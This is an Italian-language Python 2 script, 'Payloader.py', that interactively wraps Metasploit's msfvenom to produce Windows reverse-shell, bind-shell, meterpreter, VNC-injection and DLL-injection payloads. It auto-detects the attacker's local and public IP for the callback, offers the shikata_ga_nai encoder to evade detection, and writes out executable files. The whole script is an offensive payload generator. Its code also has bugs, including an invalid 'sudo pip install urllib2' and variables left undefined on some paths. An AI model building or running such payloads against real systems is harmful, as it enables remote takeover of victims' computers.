#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, platform, os, socket
from itertools import chain
from subprocess import call

try:
    from urllib2 import urlopen
except ImportError:
    os.system("sudo pip install urllib2")


# Bold
BR = "\033[1;31m"         # Rosso
BG = "\033[1;32m"       # Verde
BY = "\033[1;33m"      # Giallo
BB = "\033[1;34m"        # Blu
BP = "\033[1;35m"      # Viola
BC = "\033[1;36m"        # Azzurro
BW = "\033[1;37m"       # Bianco

# Regular Colors
W = '\033[0m'  # Bianco (normal)
R = '\033[31m'  # Rosso
G = '\033[32m'  # Verde					#Variabili per colori.
O = '\033[33m'  # Arancione
B = '\033[34m'  # Blu
P = '\033[35m'  # Viola
C = '\033[36m'  # Azzurro
GR = '\033[37m' # Grigio


header = C + """
  _____            _                 _           
 |  __ \          | |               | |          
 | |__) |_ _ _   _| | ___   __ _  __| | ___ _ __ 
 |  ___/ _` | | | | |/ _ \ / _` |/ _` |/ _ \ '__|
 | |  | (_| | |_| | | (_) | (_| | (_| |  __/ |   
 |_|   \__,_|\__, |_|\___/ \__,_|\__,_|\___|_|   
              __/ |                              
             |___/                               
             
             Payloader.py
             by storm~~ stormsh@protonmail.com""" + W


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    localaddr = s.getsockname()[0] #subnet locale
    ipaddr = urlopen("http://ip.42.pl/raw").read() #Ip pubblico
    return (ipaddr, localaddr)

def concatenate(*lists):
    new_list = []
    for i in lists:
        new_list.extend(i)
    return new_list

print header

print G + "\n[*] Generatore automatico di Payload. (metasploit) [*]\n" + P
print "Stai usando " + O + str(platform.system()) + " " + str(platform.release()) + W + "\n\nCaricamento...\n\n"

if str(platform.system()) != "Linux":
    print BR + "[!] Non stai usando un sistema operativo basato su Linux! [!]" + W

try:
    call(["msfvenom"], stderr=open(os.devnull, 'wb'))
except OSError as e:
    print BR + "[!] Msfvenom non trovato! Per favore imposta delle path appropiate o installa Metasploit se non lo hai! [!]" + W
    sys.exit(1)

payload_array = ["reverse_tcp", "bind_tcp", "reverse_http", "reverse_https"]
payload_type = ["meterpreter", "shell", "vncinject", "dllinject",]
payload_os = ["windows"]

while True:
    payload = raw_input(BB + "[>] Specificare un payload! permi invio per vedere una lista di opzioni avviabili, o inserisci il payload che desideri.")
    if payload == "":
        for o in payload_os:
            for t in payload_type:
                for a in payload_array:
                    name = o + "/" + t + "/" + a
                    print BW + name
    else:
        Payload = payload
        print "Payload => " + payload
        break


(ipaddr, localaddr) = get_ip()

print "[*] Seleziona il tipo di indirizzo [*]"
print "-------------------------------------------------------------"
print C + "(1) Usa l'indirizzo locale: " + O + localaddr + C
print "(2) Usa l'IP pubblico: " + O + ipaddr + W
print "-------------------------------------------------------------"
op1 = raw_input(BB + "[>] Quale indirizzo vuoi usare? (LHOST) > " + W)
if op1 == "1":
    LHOST = localaddr
elif op1 == "2":
    LHOST = ipaddr
else:
    LHOST = op1

print "LHOST => " + LHOST


op2 = raw_input(BB + "[>] Qual'è la porta locale (LPORT)? (premi invio per 4444, default) " + W )
if op2 == "":
    LPORT = "4444"
else:
	LPORT = op2

print "LPORT => " + LPORT


op3 = raw_input(BB + "[>] Stai usando un encoder? (s/n) " + W)
if op3 == "s":
    op4 = raw_input(BB + "[>] nome dell'encoder? (premi invio per x86/shikata_ga_nai, default) " + W)
    if op4 == "":
        Encoder = "x86/shikata_ga_nai"
    else:
        Encoder = op4
    op5 = raw_input(BB + "[>] Quante iterazioni?" + W)
    print "Encoder => " + Encoder
    print "Iterazioni => " + op5
elif op3 == "n":
    print BY + "nessun encoder selezionato!" + W
else:
    print R + """Ops qualcosa è andato nel verso sbagliato! Penso che allora sia un "no". """ + W


op6 = raw_input(BB + "[>] Qual'è il formato del payload che desideri?? (premi invio per exe, default) " + W )
if op6 == "":
    Fileformat = "exe";
else:
    Fileformat = op6
print "Formato => " + Fileformat


op7 = raw_input(BB + "[>] Vuoi aggiungere qualche opzione facoltativa? (s/n) " + W )
if op7 == "s":
    ops = raw_input(BB + "[>] Per favore inserisci le opzioni come faresti utilizzando msfvenom (per esempio: -f exe)  " + W )
    print "Opzioni facoltative => " + ops
elif op7 == "n":
    ops = " "


op8 = raw_input(BB + "[>] Qual'è il nome del payload? " + W )


if "dllinject" in payload:
    dllpath = raw_input("[>] Opzione aggiuntiva richiesta: Specifica il percorso relativo allo script DLL: ")
    print "DLLpath => " + dllpath
    print BG + "[*] Sto generando il payload... [*]"
    with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
        call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "DLL={}".format(dllpath), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)


print BG + "[*] Sto generando il payload... [*]" + W
with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
    call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)









